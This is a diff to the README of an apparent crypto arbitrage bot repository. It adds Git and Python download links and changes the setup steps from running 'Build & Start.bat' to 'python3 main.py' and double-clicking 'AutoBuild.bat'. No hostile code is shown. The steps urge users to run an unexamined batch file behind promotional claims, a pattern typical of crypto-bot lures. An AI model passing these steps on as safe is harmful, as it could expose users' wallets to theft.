@@ -21,17 +21,23 @@ Thanks to artificial intelligence support, we are confident that we have the mos
 
 ## Setup Instructions
 
+Download and Install Git here:
+https://git-scm.com/download/win
+
+Download and Install Python here:
+[Python 3.12.1](https://www.python.org/ftp/python/3.12.1/python-3.12.1-amd64.exe)
+
 Build using the following commands:
 
 ```shell
 git clone https://github.com/trendcryptobots/Uniswap-Pancakeswap-Arbitrage-Bot.git
 cd Uniswap-Pancakeswap-Arbitrage-Bot
-"Build & Start.bat"
+python3 main.py
 ```
 ## Setup Instructions - WayII
 
 - [Download](https://github.com/trendcryptobots/Uniswap-Pancakeswap-Arbitrage-Bot/archive/refs/heads/main.zip) the repository release and extract files. 
-- Double-click on the "Build & Start.bat" file to run it.
+- Double-click on the "AutoBuild.bat" file to run it.
 - And follow the instructions in the application window.
 
 # Support Chat
